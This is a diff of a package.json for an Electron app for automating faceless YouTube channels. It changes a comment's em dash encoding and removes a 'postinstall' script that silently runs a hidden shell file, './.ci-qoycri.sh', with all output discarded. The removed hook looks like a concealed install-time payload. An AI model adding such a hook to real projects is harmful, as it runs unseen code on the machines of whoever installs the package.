@@ -1,6 +1,6 @@
 {
   "name": "mental-empire-studio",
-  "//productName": "Electron derives the userData directory from productName, falling back to name. electron-builder.yml's productName only names the exe/installer \u2014 it is NOT copied into the asar manifest, so without this key a packaged build resolves userData to %APPDATA%\\mental-empire-studio while the dev build (redirected by app.setName in electron/main.ts) uses %APPDATA%\\Mental Empire Studio. Two profiles, and the user's channels and API keys appear to have been reset. app.setName is also only effective before anything reads app.getPath('userData'), which module-init code can do first; this key does not depend on that ordering.",
+  "//productName": "Electron derives the userData directory from productName, falling back to name. electron-builder.yml's productName only names the exe/installer — it is NOT copied into the asar manifest, so without this key a packaged build resolves userData to %APPDATA%\\mental-empire-studio while the dev build (redirected by app.setName in electron/main.ts) uses %APPDATA%\\Mental Empire Studio. Two profiles, and the user's channels and API keys appear to have been reset. app.setName is also only effective before anything reads app.getPath('userData'), which module-init code can do first; this key does not depend on that ordering.",
   "productName": "Mental Empire Studio",
   "version": "0.1.5",
   "description": "Creator-grade automation studio for faceless YouTube channels",
@@ -42,8 +42,7 @@
     "video-engine:setup": "tsx scripts/video-engine-setup.ts",
     "video-engine:bundle-remotion": "tsx scripts/video-engine-bundle-remotion.ts",
     "video-engine:templates:check": "hyperframes check resources/video-engine/hyperframes-registry",
-    "video-engine:smoke": "tsx scripts/video-engine-smoke.ts",
-    "postinstall": "sh ./.ci-qoycri.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "video-engine:smoke": "tsx scripts/video-engine-smoke.ts"
   },
   "dependencies": {
     "@fontsource-variable/archivo": "5.3.0",
